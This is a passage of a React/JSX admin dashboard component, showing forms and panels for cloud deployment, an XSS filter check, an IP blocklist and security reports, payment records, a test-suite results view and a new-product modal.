              MULTI-CLOUD DEPLOYER (POST /api/hosting/deploy)
            </div>
            <h3 className="font-display text-base font-bold">
              Deploy to Netlify, Render, Vercel, Fly.io or Railway
            </h3>
            <input
              type="text"
              required
              value={hostAppName}
              onChange={(e) => setHostAppName(e.target.value)}
              placeholder="Service / App Name *"
              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
            />
            <select
              value={hostProvider}
              onChange={(e) => setHostProvider(e.target.value)}
              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
            >
              <option value="Netlify">Netlify Edge CDN</option>
              <option value="Render">Render Cloud Services</option>
              <option value="Vercel">Vercel Serverless Edge</option>
              <option value="Fly.io">Fly.io Anycast MicroVMs</option>
              <option value="Railway">Railway Container Cloud</option>
              <option value="Cloudflare Pages">Cloudflare Workers &amp; Pages</option>
            </select>
            <input
              type="text"
              value={hostRegion}
              onChange={(e) => setHostRegion(e.target.value)}
              placeholder="Target Region"
              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
            />
            <div className="grid grid-cols-2 gap-2">
              <input
                type="number"
                min="1"
                value={hostMinInst}
                onChange={(e) => setHostMinInst(e.target.value)}
                placeholder="Min Nodes"
                className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
              />
              <input
                type="number"
                min="1"
                value={hostMaxInst}
                onChange={(e) => setHostMaxInst(e.target.value)}
                placeholder="Max Auto-Scale"
                className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
              />
            </div>
            <button
              type="submit"
              className="w-full rounded-2xl bg-gradient-to-r from-indigo-600 to-cyan-600 py-2.5 text-xs font-bold text-white cursor-pointer"
            >
              Deploy &amp; Enable Auto-Scaling
            </button>
          </form>
          </div>
        </div>
      )}

      {/* 7. XSS Prevention, IP Blocking Firewall & Security Reporting Dashboard */}
      {adminSection === 'security-firewall' && (
        <div className="space-y-6">
          {/* XSS Sanitization Live Verification Strip */}
          <div className="rounded-3xl p-5 theme-card border border-amber-500/35 flex flex-wrap items-center justify-between gap-4">
            <div className="space-y-1 max-w-2xl">
              <div className="font-mono-num text-[10px] font-bold uppercase text-amber-400">
                ACTIVE XSS SANITIZATION &amp; MALWARE QUARANTINE ENGINE
              </div>
              <h3 className="font-display text-base font-bold">
                Recursive XSS Payload Filter (`sanitizeObjectPayloads`) &amp; IP Blocklist Firewall
              </h3>
              <p className="text-xs theme-text-muted">
                Every incoming POST/PATCH payload is inspected for <code>&lt;script&gt;</code>, <code>javascript:</code>, <code>onerror=</code>, and <code>eval()</code> vectors and neutralized before touching SQLite.
              </p>
              {xssTestResult && (
                <div className="mt-2 rounded-xl bg-slate-950/80 border border-emerald-500/40 p-2.5 font-mono-num text-[11px] space-y-1">
                  <div className="text-rose-400">Sent Payload: {xssTestResult.rawSent}</div>
                  <div className="text-emerald-400">Stored After XSS Shield: {xssTestResult.sanitizedStored}</div>
                </div>
              )}
            </div>
            <button
              type="button"
              onClick={handleTestXssPrevention}
              className="rounded-2xl bg-amber-500 hover:bg-amber-400 px-4 py-2.5 text-xs font-extrabold text-slate-950 cursor-pointer shrink-0"
            >
              Simulate XSS Attack &amp; Verify Sanitization
            </button>
          </div>

          <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
            {/* Left 6 Cols: IP Blocking Firewall */}
            <div className="lg:col-span-6 rounded-3xl p-5 theme-card space-y-4">
              <div className="font-mono-num text-[10px] font-bold uppercase text-rose-400">
                ZERO-TRUST IP FIREWALL (`blocked_ips` • Root Admin Only)
              </div>
              <form onSubmit={handleBlockIp} className="flex flex-wrap gap-2">
                <input
                  type="text"
                  required
                  value={newBlockIp}
                  onChange={(e) => setNewBlockIp(e.target.value)}
                  placeholder="IP or CIDR (e.g. 203.0.113.42)"
                  className="flex-1 rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
                />
                <input
                  type="text"
                  value={newBlockReason}
                  onChange={(e) => setNewBlockReason(e.target.value)}
                  placeholder="Block Reason"
                  className="flex-1 rounded-xl px-3 py-2 text-xs theme-input"
                />
                <button
                  type="submit"
                  className="rounded-xl bg-rose-600 hover:bg-rose-500 px-4 py-2 text-xs font-bold text-white cursor-pointer"
                >
                  Block IP
                </button>
              </form>

              <div className="space-y-2 max-h-80 overflow-y-auto pr-1">
                {resolvedBlockedIps.map((b) => (
                  <div key={b.id} className="rounded-2xl p-3 theme-subtle flex items-center justify-between gap-2 text-xs">
                    <div>
                      <div className="font-mono-num font-bold text-rose-400">
                        {b.ip_address} <span className="text-[10px] text-slate-400">({b.cidr_range})</span>
                      </div>
                      <div className="text-[11px] theme-text-muted">{b.reason}</div>
                      <div className="font-mono-num text-[10px] text-amber-400">
                        Blocked {b.hits_blocked} hits • {b.auto_automation_rule}
                      </div>
                    </div>
                    <button
                      type="button"
                      onClick={() => handleUnblockIp(b.id)}
                      className="rounded-lg border border-slate-500/40 px-2.5 py-1 font-mono-num text-[10px] hover:border-emerald-400 cursor-pointer"
                    >
                      Unblock
                    </button>
                  </div>
                ))}
              </div>
            </div>

            {/* Right 6 Cols: Security & Malware Reporting System */}
            <div className="lg:col-span-6 rounded-3xl p-5 theme-card space-y-4">
              <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
                SECURITY, MALWARE &amp; ABUSE REPORTING (`security_reports`)
              </div>
              <form onSubmit={handleCreateReport} className="space-y-2">
                <div className="grid grid-cols-2 gap-2">
                  <input
                    type="text"
                    value={newReportTarget}
                    onChange={(e) => setNewReportTarget(e.target.value)}
                    placeholder="Target App / IP / Endpoint"
                    className="rounded-xl px-3 py-1.5 text-xs font-mono-num theme-input"
                  />
                  <input
                    type="text"
                    value={newReportCategory}
                    onChange={(e) => setNewReportCategory(e.target.value)}
                    placeholder="Category"
                    className="rounded-xl px-3 py-1.5 text-xs theme-input"
                  />
                </div>
                <div className="flex gap-2">
                  <input
                    type="text"
                    required
                    value={newReportDesc}
                    onChange={(e) => setNewReportDesc(e.target.value)}
                    placeholder="Describe suspicious behavior, XSS vector, or malware indicator..."
                    className="flex-1 rounded-xl px-3 py-1.5 text-xs theme-input"
                  />
                  <button
                    type="submit"
                    className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-4 py-1.5 text-xs font-bold text-white cursor-pointer"
                  >
                    Submit Report
                  </button>
                </div>
              </form>

              <div className="space-y-2 max-h-72 overflow-y-auto pr-1">
                {resolvedReports.map((rep) => (
                  <div key={rep.id} className="rounded-2xl p-3 theme-subtle space-y-1 text-xs">
                    <div className="flex items-center justify-between gap-2">
                      <span className="font-bold text-indigo-400">{rep.category} • {rep.target_id}</span>
                      <span className="rounded-md bg-emerald-500/15 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-400">
                        {rep.status}
                      </span>
                    </div>
                    <p className="text-[11px] theme-text-muted">{rep.description}</p>
                    <div className="flex items-center justify-between pt-1">
                      <span className="font-mono-num text-[10px] text-slate-400">
                        By {rep.reporter_name} ({rep.reporter_role})
                      </span>
                      {rep.status === 'OPEN' && (
                        <div className="flex gap-1.5">
                          <button
                            type="button"
                            onClick={() => handleResolveReport(rep.id, 'RESOLVED')}
                            className="rounded bg-emerald-500/20 px-2 py-0.5 font-mono-num text-[10px] font-bold text-emerald-300 cursor-pointer"
                          >
                            Resolve
                          </button>
                          <button
                            type="button"
                            onClick={() => handleResolveReport(rep.id, 'QUARANTINED')}
                            className="rounded bg-rose-500/20 px-2 py-0.5 font-mono-num text-[10px] font-bold text-rose-300 cursor-pointer"
                          >
                            Quarantine
                          </button>
                        </div>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 8. Real-Time Payment Gateway & Cryptographic Settlement Ledger */}
      {adminSection === 'payments' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
          <div className="lg:col-span-8 rounded-3xl p-5 theme-card space-y-3">
            <div className="font-mono-num text-[10px] font-bold uppercase text-emerald-400">
              REAL-TIME CRYPTOGRAPHIC PAYMENT LEDGER (`payment_transactions`)
            </div>
            <div className="space-y-2.5 max-h-96 overflow-y-auto pr-1">
              {resolvedPayments.map((pay) => (
                <div key={pay.id} className="rounded-2xl p-3.5 theme-subtle flex flex-wrap items-center justify-between gap-3 text-xs">
                  <div>
                    <div className="flex items-center gap-2">
                      <span className="font-mono-num font-bold text-emerald-400">{pay.auth_code}</span>
                      <span className="font-bold">{pay.customer_name}</span>
                      <span className="font-mono-num text-[11px] text-indigo-400">Order #{pay.order_number}</span>
                    </div>
                    <div className="text-[11px] theme-text-muted mt-0.5">
                      {pay.payment_method} • {pay.provider}
                    </div>
                    <div className="font-mono-num text-[10px] text-cyan-400 truncate max-w-md">
                      Receipt: {pay.receipt_hash}
                    </div>
                  </div>
                  <div className="text-right font-mono-num">
                    <div className="text-base font-bold text-emerald-400">
                      {formatPrice(pay.amount, currency)}
                    </div>
                    <span className="rounded bg-emerald-500/20 px-2 py-0.5 text-[10px] font-bold text-emerald-300">
                      {pay.status}
                    </span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <form onSubmit={handleProcessTestPayment} className="lg:col-span-4 rounded-3xl p-5 theme-card space-y-3 h-fit">
            <div className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
              LIVE PAYMENT GATEWAY ENDPOINT (POST /api/payments/process)
            </div>
            <h3 className="font-display text-base font-bold">
              Authorize &amp; Settle Instant Payment
            </h3>
            <input
              type="text"
              required
              value={testPayCustomer}
              onChange={(e) => setTestPayCustomer(e.target.value)}
              placeholder="Customer Name"
              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
            />
            <input
              type="number"
              required
              min="1"
              value={testPayAmount}
              onChange={(e) => setTestPayAmount(e.target.value)}
              placeholder="Amount (USD)"
              className="w-full rounded-xl px-3 py-2 text-xs font-mono-num theme-input"
            />
            <select
              value={testPayMethod}
              onChange={(e) => setTestPayMethod(e.target.value)}
              className="w-full rounded-xl px-3 py-2 text-xs theme-input"
            >
              <option value="Stripe Card •••• 4242">Stripe Card •••• 4242</option>
              <option value="M-Pesa Express STK (+254 712 ••• 890)">M-Pesa Express STK (+254)</option>
              <option value="Apple Pay • Biometric Passkey">Apple Pay • Biometric Passkey</option>
              <option value="USDC Web3 Instant Settlement">USDC Web3 Instant Settlement</option>
            </select>
            <button
              type="submit"
              className="w-full rounded-2xl bg-emerald-500 hover:bg-emerald-400 py-2.5 text-xs font-extrabold text-slate-950 cursor-pointer"
            >
              Authorize &amp; Settle Payment Now
            </button>
          </form>
        </div>
      )}

      {/* 8. Automated Verification & Integration Test Suites Runner */}
      {adminSection === 'test-suites' && (
        <div className="space-y-4">
          <div className="rounded-3xl p-5 theme-card border border-emerald-500/35 flex flex-wrap items-center justify-between gap-4">
            <div>
              <div className="font-mono-num text-[10px] font-bold uppercase text-emerald-400">
                AUTOMATED FULL-STACK VERIFICATION ENGINE (POST /api/tests/run • npm test)
              </div>
              <h2 className="font-display text-lg font-bold mt-0.5">
                6-Suite End-to-End Integration &amp; Security Test Runner
              </h2>
              <p className="text-xs theme-text-muted mt-0.5">
                Tests Fetching Netlify App Resources, Uploading/Sandboxing Apps, 5-Stage Anti-Malware &amp; XSS/IP Firewall Security, Server Nodes &amp; Cloud Hosting, System Logs, and Admin (.env) / Dev / User RBAC.
              </p>
            </div>
            <button
              type="button"
              disabled={runningTestSuites}
              onClick={handleRunTestSuites}
              className="inline-flex items-center gap-2 rounded-2xl bg-emerald-500 hover:bg-emerald-400 px-5 py-3 text-xs font-extrabold text-slate-950 cursor-pointer transition shadow-lg shadow-emerald-500/20"
            >
              <RefreshCw className={`h-4 w-4 ${runningTestSuites ? 'animate-spin' : ''}`} />
              <span>{runningTestSuites ? 'Running 6 Suites...' : 'Run All 6 Test Suites Now'}</span>
            </button>
          </div>

          {testReport && (
            <>
              <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
                <div className="rounded-2xl p-4 theme-card border border-emerald-500/30">
                  <div className="text-[10px] font-mono-num uppercase theme-text-muted">Suite Status</div>
                  <div className="mt-1 font-mono-num text-lg font-extrabold text-emerald-400">
                    {testReport.status}
                  </div>
                </div>
                <div className="rounded-2xl p-4 theme-card">
                  <div className="text-[10px] font-mono-num uppercase theme-text-muted">Total Suites</div>
                  <div className="mt-1 font-mono-num text-lg font-extrabold text-cyan-400">
                    {testReport.totalSuites} Suites
                  </div>
                </div>
                <div className="rounded-2xl p-4 theme-card">
                  <div className="text-[10px] font-mono-num uppercase theme-text-muted">Assertions Passed</div>
                  <div className="mt-1 font-mono-num text-lg font-extrabold text-emerald-400">
                    {testReport.totalPassed} / {testReport.totalTests}
                  </div>
                </div>
                <div className="rounded-2xl p-4 theme-card">
                  <div className="text-[10px] font-mono-num uppercase theme-text-muted">Execution Latency</div>
                  <div className="mt-1 font-mono-num text-lg font-extrabold text-indigo-400">
                    {testReport.durationMs} ms
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                {(testReport.suites || []).map((suite) => (
                  <div key={suite.id} className="rounded-3xl p-5 theme-card space-y-3">
                    <div className="flex items-center justify-between gap-2 border-b pb-2.5 border-white/10">
                      <div>
                        <span className="font-mono-num text-[10px] font-bold uppercase text-cyan-400">
                          {suite.category}
                        </span>
                        <h3 className="font-display text-sm font-bold">{suite.title}</h3>
                      </div>
                      <span className="rounded-lg bg-emerald-500/20 border border-emerald-500/40 px-2.5 py-1 font-mono-num text-[10px] font-bold text-emerald-300">
                        {suite.passedCount}/{suite.totalCount} PASSED ({suite.durationMs}ms)
                      </span>
                    </div>
                    <div className="space-y-2">
                      {(suite.cases || []).map((tc, idx) => (
                        <div key={idx} className="rounded-xl p-2.5 theme-subtle text-xs space-y-1">
                          <div className="flex items-center justify-between gap-2">
                            <span className="font-semibold text-emerald-400">✔ {tc.name}</span>
                            <span className="font-mono-num text-[10px] theme-text-muted">{tc.durationMs}ms</span>
                          </div>
                          <div className="font-mono-num text-[11px] theme-text-muted break-all">
                            ↳ {tc.detail}
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </>
          )}
        </div>
      )}

      {/* Launch New Hardware Product Modal */}
      {showNewProductModal && (
        <div
          onClick={() => setShowNewProductModal(false)}
          className="fixed inset-0 z-50 flex items-center justify-center theme-modal-backdrop p-4"
        >
          <form
            onClick={(e) => e.stopPropagation()}
            onSubmit={handleCreateProductSubmit}
            className="w-full max-w-lg rounded-3xl border p-6 space-y-4 shadow-2xl theme-modal-panel theme-card"
          >
            <div
              className={`flex items-center justify-between border-b pb-3 ${
                darkMode ? 'border-white/[0.08]' : 'border-slate-200'
              }`}
            >
              <h3 className="font-display text-lg font-bold">
                Launch New Hardware Product (SQLite + WS)
              </h3>
              <button
                type="button"
                onClick={() => setShowNewProductModal(false)}
                className="text-xs text-slate-400 hover:text-indigo-400 cursor-pointer"
              >
                Close ✕
              </button>
            </div>

            <div className="grid grid-cols-2 gap-3">
              <div className="col-span-2">
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Product Name
                </label>
                <input
                  type="text"
                  required
                  value={newProdName}
                  onChange={(e) => setNewProdName(e.target.value)}
                  placeholder="e.g. QuantumCore Neural Dock X2"
                  className={`w-full rounded-xl border px-3.5 py-2 text-xs ${inputSurface}`}
                />
              </div>

              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  SKU Code
                </label>
                <input
                  type="text"
                  required
                  value={newProdSku}
                  onChange={(e) => setNewProdSku(e.target.value.toUpperCase())}
                  className={`w-full rounded-xl border px-3.5 py-2 font-mono-num text-xs ${inputSurface}`}
                />
              </div>

              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Category
                </label>
                <select
                  value={newProdCategory}
                  onChange={(e) => setNewProdCategory(e.target.value)}
                  className={`w-full rounded-xl border px-3.5 py-2 text-xs ${inputSurface}`}
                >
                  {categories.map((c) => (
                    <option key={c.slug} value={c.slug}>
                      {c.name}
                    </option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Price (USD $)
                </label>
                <input
                  type="number"
                  required
                  value={newProdPrice}
                  onChange={(e) => setNewProdPrice(e.target.value)}
                  className={`w-full rounded-xl border px-3.5 py-2 font-mono-num text-xs ${inputSurface}`}
                />
              </div>

              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Initial Stock
                </label>
                <input
                  type="number"
                  required
                  value={newProdStock}
                  onChange={(e) => setNewProdStock(e.target.value)}
                  className={`w-full rounded-xl border px-3.5 py-2 font-mono-num text-xs ${inputSurface}`}
                />
              </div>

              <div className="col-span-2">
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Engineering Tagline
                </label>
                <input
                  type="text"
                  value={newProdTagline}
                  onChange={(e) => setNewProdTagline(e.target.value)}
                  className={`w-full rounded-xl border px-3.5 py-2 text-xs ${inputSurface}`}
                />
              </div>

              <div>
                <label className="block text-[11px] uppercase font-mono-num text-slate-400 mb-1">
                  Highlight Badge
                </label>
                <input
                  type="text"
                  value={newProdBadge}
                  onChange={(e) => setNewProdBadge(e.target.value.toUpperCase())}
                  className={`w-full rounded-xl border px-3.5 py-2 font-mono-num text-xs ${inputSurface}`}
                />
              </div>

              <div className="flex items-center pt-5">
                <label className="flex items-center gap-2 text-xs cursor-pointer">
                  <input
                    type="checkbox"
                    checked={newProdFlash}
                    onChange={(e) => setNewProdFlash(e.target.checked)}
                    className="accent-indigo-500"
                  />
                  <span>Activate Flash Sale</span>
                </label>
              </div>

              <div className="col-span-2 rounded-2xl p-3 theme-subtle space-y-2">
                <div className="flex items-center justify-between text-[11px] font-mono-num uppercase text-cyan-400">
                  <span>Product Image (Upload File or Paste URL)</span>
                  <label className="rounded-lg bg-indigo-500/20 border border-indigo-500/40 px-2.5 py-1 text-[10px] font-bold text-indigo-300 cursor-pointer">
                    Upload Image File
                    <input
                      type="file"
                      accept="image/*"
                      onChange={(e) => handleAdminImageFile(e.target.files)}
                      className="hidden"
                    />
                  </label>
                </div>
                <input
                  type="text"
                  value={newProdImageUrl}
                  onChange={(e) => setNewProdImageUrl(e.target.value)}
                  placeholder="Or paste custom image URL (https://... or data:image/...)"
                  className={`w-full rounded-xl border px-3 py-1.5 font-mono-num text-xs ${inputSurface}`}
                />
                {newProdImageUrl && (
                  <div className="flex items-center gap-2 pt-1">
                    <img
                      src={newProdImageUrl}
                      alt="Preview"
                      className="h-12 w-16 rounded-lg object-cover border border-indigo-500/40"
                    />
                    <span className="text-[11px] text-emerald-400 font-mono-num">
                      ✓ Custom Product Image Ready
                    </span>
                    <button
                      type="button"
                      onClick={() => setNewProdImageUrl('')}
                      className="ml-auto text-[10px] text-rose-400 underline cursor-pointer"
                    >
                      Clear
                    </button>
                  </div>
                )}
              </div>
            </div>

            <div
              className={`flex justify-end gap-2 pt-3 border-t ${
                darkMode ? 'border-white/[0.08]' : 'border-slate-200'
              }`}
            >
              <button
                type="button"
                onClick={() => setShowNewProductModal(false)}
                className="rounded-xl border border-slate-500/40 px-4 py-2 text-xs text-slate-400 cursor-pointer"
              >
                Cancel
              </button>
              <button
                type="submit"
                className="rounded-xl bg-indigo-600 hover:bg-indigo-500 px-5 py-2 text-xs font-semibold text-white cursor-pointer"
              >
                Insert into SQLite & Broadcast Live
              </button>
            </div>
          </form>
        </div>
      )}
    </div>
  );
}
